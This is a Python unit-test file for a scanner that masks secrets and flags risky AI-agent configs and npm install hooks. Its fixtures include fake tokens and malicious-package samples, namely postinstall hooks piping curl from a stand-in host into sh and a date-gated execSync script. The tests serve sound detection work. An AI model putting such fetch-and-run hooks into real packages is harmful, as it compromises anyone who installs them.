import json
import os
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from honeyrun import installed
from honeyrun.installed import mask, scan_agent_configs, scan_dependencies


def tree(files: dict[str, str]) -> Path:
    root = Path(tempfile.mkdtemp())
    for rel, body in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(body)
    return root


def pkgjson(**kw):
    return json.dumps(kw)


class Mask(unittest.TestCase):
    def test_secret_forms_are_masked(self):
        cases = {
            "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY": "wJal****",
            "Bearer abcdefgh12345678": "Bearer abcd****",
            "Authorization: s3cr3tvalue12345": "Authorization: s3cr****",
            "password=hunter2": "password=****",
            "PASSWORD: hunter2": "PASSWORD: ****",
            "--api-key abc123def456ghi789": "--api-key ****",
            "--token=abc123def456ghi789": "--token=****",
            "API_KEY=abc123def456ghi789xyz": "API_KEY=****",
            "https://user:hunter2@github.com/o/r": "https://user:****@github.com/o/r",
            "user:hunter2@github.com/o/r": "user:****@github.com/o/r",
            "sk-ant-api03-abcdefghijkl": "sk-a****",
            "sk-proj-abcdefghijkl": "sk-p****",
            "ghp_abcdefghijklmnop": "ghp_****",
            "gho_abcdefghijklmnop": "gho_****",
            "ghu_abcdefghijklmnop": "ghu_****",
            "ghs_abcdefghijklmnop": "ghs_****",
            "ghr_abcdefghijklmnop": "ghr_****",
            "github_pat_11ABCDEFG0abcdefgh": "gith****",
            "xoxb-1234567890-abcdefgh": "xoxb****",
            "AKIAIOSFODNN7EXAMPLE": "AKIA****",
            "glpat-abcdefghij1234": "glpa****",
            "npm_abcdefghijklmnop": "npm_****",
            "hf_abcdefghijklmnop": "hf_a****",
            "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.sig": "eyJh****",
        }
        for raw, want in cases.items():
            got = mask(f"run {raw} now")
            self.assertIn(want, got, raw)
            secret = raw.split("=", 1)[-1].split(": ")[-1].split(" ")[-1].split(":")[-1].split("@")[0]
            if len(secret) > 6 and "://" not in raw and "@" not in raw:
                self.assertNotIn(secret, got, raw)
        self.assertNotIn("hunter2", mask("x user:hunter2@github.com/o/r y"))
        self.assertNotIn("EXAMPLEKEY", mask("aws wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"))
        self.assertNotIn("hunter2", mask('"password": "hunter2"'))

    def test_ordinary_text_is_untouched(self):
        for s in ("npx -y @modelcontextprotocol/server-filesystem /Users/x/projects",
                  "/usr/local/lib/node_modules/some-extremely-long-package-name-here-v2/index.js",
                  "src/components/very-long-component-name-for-a-widget-2/index.tsx",
                  "the author wrote this: max_tokens=100 and --auth-type basic",
                  "123e4567-e89b-12d3-a456-426614174000",
                  "task-manager-with-a-really-long-name-here",
                  "me@example.com wrote to you", "git@github.com:org/repo.git",
                  "https://example.com/a/b?x=1", "node server.js --port 8080"):
            self.assertEqual(mask(s), s, s)

    def test_home_is_replaced(self):
        home = os.path.expanduser("~")
        self.assertEqual(mask(f"{home}/.cursor/mcp.json"), "~/.cursor/mcp.json")
        self.assertEqual(mask("/tmp/fakehome/.cursor/x", home="/tmp/fakehome"), "~/.cursor/x")
        self.assertEqual(mask("/tmp/fakehome2/x", home="/tmp/fakehome"), "/tmp/fakehome2/x")

    def test_idempotent(self):
        once = mask("password=hunter2 Bearer abcdefgh12345678 user:pw@github.com/o")
        self.assertEqual(mask(once), once)


class AgentConfigs(unittest.TestCase):
    def test_odd_specs_and_masking_with_temp_home(self):
        home = tree({
            ".cursor/mcp.json": json.dumps({"mcpServers": {
                "a": {"command": "npx", "args": "not-a-list", "env": ["X"]},
                "b": {"command": "node", "args": [f"{{HOME}}/x.js", "--token", "abc123def456ghi789"], "env": {"K": "v"}},
                "c": {"url": "https://u:pw@host.example.net/mcp?key=1"},
            }}),
            ".codex/config.toml": '[mcp_servers.z]\ncommand = "x"\nargs = ["--password", "hunter2"]\n',
        })
        text = json.loads((home / ".cursor/mcp.json").read_text())
        text["mcpServers"]["b"]["args"][0] = f"{home}/x.js"
        (home / ".cursor/mcp.json").write_text(json.dumps(text))
        out = scan_agent_configs(home=home)
        blob = "\n".join(f.title + f.detail for f in out)
        self.assertNotIn(str(home), blob)
        self.assertNotIn("abc123def456ghi789", blob)
        self.assertNotIn("hunter2", blob)
        self.assertNotIn(":pw@", blob)
        self.assertIn("~/x.js", blob)
        self.assertIn("(env: K)", blob)


class Dependencies(unittest.TestCase):
    def test_pnpm_layout_is_scanned(self):
        root = tree({"node_modules/.pnpm/evil@1.0.0/node_modules/evil/package.json":
                     pkgjson(name="evil", scripts={"postinstall": "curl http://a.example.net/x | sh"})})
        got = scan_dependencies(root)
        self.assertTrue(any(f.severity == "high" and f.rule == "install-hook" for f in got))
        self.assertTrue(any(f.title == "1 installed packages checked" for f in got))

    def test_symlinks_are_never_followed_out(self):
        outside = tree({"p/package.json": pkgjson(name="outside", scripts={"postinstall": "curl x | sh"})})
        root = tree({"node_modules/a/package.json": pkgjson(name="a")})
        os.symlink(outside / "p", root / "node_modules" / "linked")
        got = scan_dependencies(root)
        self.assertFalse(any("outside" in f.title for f in got))

    def test_summary_even_when_empty(self):
        got = scan_dependencies(tree({"x.txt": "1"}))
        self.assertEqual([f.title for f in got], ["0 installed packages checked"])
        self.assertEqual(got[0].severity, "info")

    def test_cap_is_reported(self):
        root = tree({f"node_modules/p{i}/package.json": pkgjson(name=f"p{i}") for i in range(4)})
        with mock.patch.object(installed, "MAX_PACKAGES", 2):
            got = scan_dependencies(root)
        self.assertTrue(any(f.severity == "medium" and "scan incomplete" in f.title for f in got))

    def test_dot_prefixed_script_and_escape(self):
        root = tree({
            "node_modules/a/package.json": pkgjson(name="a", scripts={"postinstall": "node ./.setup.js"}),
            "node_modules/a/.setup.js": "const d = new Date('2031-01-01'); require('child_process').execSync('id')",
            "node_modules/b/package.json": pkgjson(name="b", scripts={"postinstall": "node ../a/.setup.js"}),
        })
        got = scan_dependencies(root)
        self.assertTrue(any(f.rule == "delayed-activation" and "dependency a" in f.title for f in got))
        self.assertFalse(any(f.rule == "delayed-activation" and "dependency b" in f.title for f in got))

    def test_odd_metadata_and_permission_errors(self):
        root = tree({"node_modules/a/package.json": pkgjson(name="a", scripts=["x"]),
                     "node_modules/@s/b/package.json": pkgjson(name="@s/b", scripts={"postinstall": 5})})
        real = Path.iterdir

        def deny(self):
            if self.name == "@s":
                raise PermissionError("no")
            return real(self)

        with mock.patch.object(Path, "iterdir", deny):
            got = scan_dependencies(root)
        self.assertTrue(any("installed packages checked" in f.title for f in got))


if __name__ == "__main__":
    unittest.main()
